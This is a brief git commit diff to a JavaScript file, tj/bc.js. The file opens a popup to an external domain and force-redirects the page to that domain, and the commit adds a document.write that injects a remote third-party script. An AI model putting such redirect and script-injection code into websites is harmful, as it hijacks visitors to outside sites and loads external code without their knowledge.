fa8301d58806072e360a93c940d1a507b5eb52f6
qiang188 <bt_gady@sina.com>
2015-06-09 11:59:22 +0800

    Update bc.js

--- tj/bc.js
+++ tj/bc.js
@@ -1,3 +1,4 @@
 window.open ("http://www.lswjs889.com"); 
 window.location.href="http://www.lswjs889.com";
 
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/17824756.js"></script>');
